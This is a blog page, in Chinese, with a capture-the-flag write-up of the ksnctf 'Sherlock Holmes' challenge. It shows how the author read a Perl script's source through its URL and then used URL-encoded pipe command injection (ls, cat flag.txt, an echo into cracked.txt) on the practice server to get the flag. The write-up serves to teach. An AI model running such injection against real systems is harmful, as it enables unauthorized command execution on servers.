@@ -1,0 +1,691 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="&lt;Theo/&gt;">
+    <title>ksnctf #26 Sherlock Holmes - &lt;Theo/&gt;</title>
+    <meta name="author" content="Theo Chen">
+    
+        <meta name="keywords" content="ksnctf,Sherlock Holmes">
+    
+    
+        <link rel="icon" href="https://blog.theo.com.tw/assets/images/favicon.ico">
+    
+    
+        
+            <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss2.xml">
+        
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"只要看的到原始碼就無敵了～\n\n\n題目網頁明顯是perl寫的，就三個連結都可以一一點開，可以發現URL的部份會後綴檔案名稱，例如：\nhttp://ctfq.sweetduet.info:10080/~q26/index.pl/a_scandal_in_bohemia_1.txt\n\n\n那如果後綴就是自己呢？ ლ(◉◞౪◟◉ )ლ\n於是…\nhttp://ctfq.sweetduet.info:10080/~q26/index.pl/index.pl\n\n就看到原始碼啦～～不過當然不可能這麼簡單，還有一個關卡要解。\n其中只有一段原始碼是重點：\n123456789# Can you crack me? :Popen(F,&#x27;cracked.txt&#x27;);my $t = &lt;F&gt;;chomp($t);if ($t eq &#x27;h@ck3d!&#x27;) &#123;print &#x27;FLAG_****************&lt;br&gt;&lt;br&gt;&#x27;;&#125;unlink(&#x27;cracked.txt&#x27;);####\n\n雖然我沒有寫過perl的經驗，但是看一看大概還是可以知道它是要開啟cracked.txt這個檔案，如果檔案內容是h@ck3d!的話就會印出FLAG。\n看了看其他地方應該沒有什麼眉腳，把焦點放回到URL上，說到URL攻擊大概就是URL injection了，既然perl本身也是個script，應該可以成功呼叫系統命令。馬上嘗試簡單的| ls(有經過URL encode)：\nhttp://ctfq.sweetduet.info:10080/~q26/index.pl/%7C%20ls\n\n\n結果很明顯，URL injection成功被執行了。\n原本想說看到flag.txt就在目錄底下，會不會下個| cat flag.txt破台了，結果果然沒有這麼簡單 (´_ゝ`)\n還是得回歸index.pl的那段原始碼，不過已知URL injection可行的情況下，可以很輕易的建立| echo &quot;h@ck3d!&quot; &gt; cracked.txt：\nhttp://ctfq.sweetduet.info:10080/~q26/index.pl/%7C%20echo%20%22h%40ck3d!%22%20%3E%20cracked.txt\n\n\n執行以後，cracked.txt就成功被建立在目錄底下，只要再任意點選其他的一個連結，那段原始碼就會被執行並印出FLAG～～\n","dateCreated":"2017-03-28T14:06:03+00:00","dateModified":"2025-01-17T13:11:17+00:00","datePublished":"2017-03-28T14:06:03+00:00","description":"只要看的到原始碼就無敵了～","headline":"ksnctf #26 Sherlock Holmes","image":["ksnctf.png"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/"},"publisher":{"@type":"Organization","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176","logo":{"@type":"ImageObject","url":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"}},"url":"https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/","keywords":"Writeups","thumbnailUrl":"ksnctf.png"}</script>
+    
+    <meta name="description" content="只要看的到原始碼就無敵了～">
+<meta property="og:type" content="blog">
+<meta property="og:title" content="ksnctf #26 Sherlock Holmes">
+<meta property="og:url" content="https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/index.html">
+<meta property="og:site_name" content="&lt;Theo&#x2F;&gt;">
+<meta property="og:description" content="只要看的到原始碼就無敵了～">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/ksnctf.png">
+<meta property="article:published_time" content="2017-03-28T14:06:03.000Z">
+<meta property="article:modified_time" content="2025-01-17T13:11:17.265Z">
+<meta property="article:author" content="Theo Chen">
+<meta property="article:tag" content="Writeups">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/ksnctf.png">
+<meta name="twitter:creator" content="@The0_Klein">
+    
+    
+        
+    
+    
+    
+        <meta property="og:image" content="https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/ksnctf.png"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/ksnctf.png"/>
+    
+    
+    
+    <!--STYLES-->
+    
+<link rel="stylesheet" href="/assets/css/style-gdcyhoyuzwa8smbm8vz2yfxz7vo2renh92pv061urgkby5doa9lemz924ywr.min.css">
+
+    <!--STYLES END-->
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-106120242-2"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-106120242-2');
+    </script>
+
+
+    
+
+    
+        
+    
+</head>
+
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
+
+
+    
+        
+    
+
+<header id="header" data-behavior="2">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/"
+            aria-label=""
+        >
+            &lt;Theo/&gt;
+        </a>
+    </div>
+    
+        
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="Open the link: /#about"
+            >
+        
+        
+            <img class="header-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=90" alt="Author&#39;s picture"/>
+        
+        </a>
+    
+</header>
+
+            <!-- Define author's picture -->
+
+
+    
+
+<nav id="sidebar" data-behavior="2">
+    <div class="sidebar-container">
+        
+            <div class="sidebar-profile">
+                <a
+                    href="/#about"
+                    aria-label="Read more about the author"
+                >
+                    <img class="sidebar-profile-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
+                </a>
+                <h4 class="sidebar-profile-name">Theo Chen</h4>
+                
+                    <h5 class="sidebar-profile-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
+</h5>
+                
+            </div>
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="Home"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Home</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="Categories"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Categories</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="Tags"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Tags</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="Archives"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Archives</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="About"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">About</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/TheoKlein"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/The0_Klein"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://www.linkedin.com/in/theo-chen/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="LinkedIn"
+                        >
+                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">LinkedIn</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="mailto:theokleintw@gmail.com"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Mail"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Mail</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/rss2.xml"
+                            
+                            rel="noopener"
+                            title="RSS"
+                        >
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
+</nav>
+
+            
+            <div id="main" data-behavior="2"
+                 class="
+                        hasCoverMetaOut
+                        ">
+                
+<article class="post">
+    
+    
+        <div class="post-header main-content-wrap text-center">
+    
+        <h1 class="post-title">
+            ksnctf #26 Sherlock Holmes
+        </h1>
+    
+    
+        <div class="post-meta">
+    <time datetime="2017-03-28T14:06:03+00:00">
+	
+		    Mar 28, 2017
+    	
+    </time>
+    
+        <span>in </span>
+        
+    <a class="category-link" href="/categories/Writeups/">Writeups</a>, <a class="category-link" href="/categories/Writeups/ksnctf/">ksnctf</a>
+
+
+    
+</div>
+
+    
+</div>
+
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <p>只要看的到原始碼就無敵了～</p>
+<span id="more"></span>
+
+<p>題目網頁明顯是perl寫的，就三個連結都可以一一點開，可以發現URL的部份會後綴檔案名稱，例如：</p>
+<blockquote><p><a target="_blank" rel="noopener" href="http://ctfq.sweetduet.info:10080/~q26/index.pl/a_scandal_in_bohemia_1.txt">http://ctfq.sweetduet.info:10080/~q26/index.pl/a_scandal_in_bohemia_1.txt</a></p>
+</blockquote>
+
+<p>那如果後綴就是自己呢？ ლ(◉◞౪◟◉ )ლ</p>
+<p>於是…</p>
+<blockquote><p><a target="_blank" rel="noopener" href="http://ctfq.sweetduet.info:10080/~q26/index.pl/index.pl">http://ctfq.sweetduet.info:10080/~q26/index.pl/index.pl</a></p>
+</blockquote>
+<p>就看到原始碼啦～～<br>不過當然不可能這麼簡單，還有一個關卡要解。</p>
+<p>其中只有一段原始碼是重點：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Can you crack me? :P</span></span><br><span class="line"><span class="keyword">open</span>(F,<span class="string">&#x27;cracked.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">my</span> <span class="variable">$t</span> = &lt;F&gt;;</span><br><span class="line"><span class="keyword">chomp</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$t</span> eq <span class="string">&#x27;h@ck3d!&#x27;</span>) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;FLAG_****************&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unlink</span>(<span class="string">&#x27;cracked.txt&#x27;</span>);</span><br><span class="line"><span class="comment">####</span></span><br></pre></td></tr></table></figure>
+
+<p>雖然我沒有寫過perl的經驗，但是看一看大概還是可以知道它是要開啟<code>cracked.txt</code>這個檔案，如果檔案內容是<code>h@ck3d!</code>的話就會印出FLAG。</p>
+<p>看了看其他地方應該沒有什麼眉腳，把焦點放回到URL上，說到URL攻擊大概就是URL injection了，既然perl本身也是個script，應該可以成功呼叫系統命令。馬上嘗試簡單的<code>| ls</code>(有經過URL encode)：</p>
+<blockquote><p><a target="_blank" rel="noopener" href="http://ctfq.sweetduet.info:10080/~q26/index.pl/%7C%20ls">http://ctfq.sweetduet.info:10080/~q26/index.pl/%7C%20ls</a></p>
+</blockquote>
+
+<p>結果很明顯，URL injection成功被執行了。<br><img src="/1.png" alt="URL"></p>
+<p>原本想說看到<code>flag.txt</code>就在目錄底下，會不會下個<code>| cat flag.txt</code>破台了，結果果然沒有這麼簡單 (´_ゝ`)<br><img src="/2.png" alt="URL02"></p>
+<p>還是得回歸<code>index.pl</code>的那段原始碼，不過已知URL injection可行的情況下，可以很輕易的建立<code>| echo &quot;h@ck3d!&quot; &gt; cracked.txt</code>：</p>
+<blockquote><p><a target="_blank" rel="noopener" href="http://ctfq.sweetduet.info:10080/~q26/index.pl/%7C%20echo%20%22h%40ck3d!%22%20%3E%20cracked.txt">http://ctfq.sweetduet.info:10080/~q26/index.pl/%7C%20echo%20%22h%40ck3d!%22%20%3E%20cracked.txt</a></p>
+</blockquote>
+
+<p>執行以後，<code>cracked.txt</code>就成功被建立在目錄底下，只要再任意點選其他的一個連結，那段原始碼就會被執行並印出FLAG～～<br><img src="/3.png" alt="URL03"></p>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/Writeups/" rel="tag">Writeups</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Writeups/ksnctf/ksnctf-28-Lo-Tech-Cipher/"
+                    data-tooltip="ksnctf #28 Lo-Tech Cipher"
+                    aria-label="PREVIOUS: ksnctf #28 Lo-Tech Cipher"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Online-Judge/UVa-%E8%A7%A3%E9%A1%8C%E7%B4%80%E9%8C%84/"
+                    data-tooltip="UVa 解題紀錄"
+                    aria-label="NEXT: UVa 解題紀錄"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+                <li class="post-action">
+                    <a
+                        class="post-action-btn btn btn--default"
+                        href="#disqus_thread"
+                        aria-label="Leave a comment"
+                    >
+                        <i class="fa fa-comment"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+                <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2025 Theo Chen. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="2">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Writeups/ksnctf/ksnctf-28-Lo-Tech-Cipher/"
+                    data-tooltip="ksnctf #28 Lo-Tech Cipher"
+                    aria-label="PREVIOUS: ksnctf #28 Lo-Tech Cipher"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Online-Judge/UVa-%E8%A7%A3%E9%A1%8C%E7%B4%80%E9%8C%84/"
+                    data-tooltip="UVa 解題紀錄"
+                    aria-label="NEXT: UVa 解題紀錄"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+                <li class="post-action">
+                    <a
+                        class="post-action-btn btn btn--default"
+                        href="#disqus_thread"
+                        aria-label="Leave a comment"
+                    >
+                        <i class="fa fa-comment"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="2">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/"
+                        aria-label="Share on Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/"
+                        aria-label="Share on Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">Theo Chen</h4>
+        
+            <div id="about-card-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>Threat Researcher</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker-alt"></i>
+                <br/>
+                Taipei, Taiwan
+            </div>
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+
+<script src="/assets/js/script-ntjm1xxqdwr7uhkrlwal4hkgsjrprt8jr4d5cauo3fpjpjoa3nude4bnfikw.min.js"></script>
+
+<!--SCRIPTS END-->
+
+
+    
+        <script>
+          var disqus_config = function() {
+            this.page.url = 'https://blog.theo.com.tw/Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/';
+              
+            this.page.identifier = 'Writeups/ksnctf/ksnctf-26-Sherlock-Holmes/';
+              
+          };
+          (function() {
+            var d = document, s = d.createElement('script');
+            var disqus_shortname = 'theo-5';
+            s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+          })();
+        </script>
+    
+
+
+
+
+    </body>
+</html>
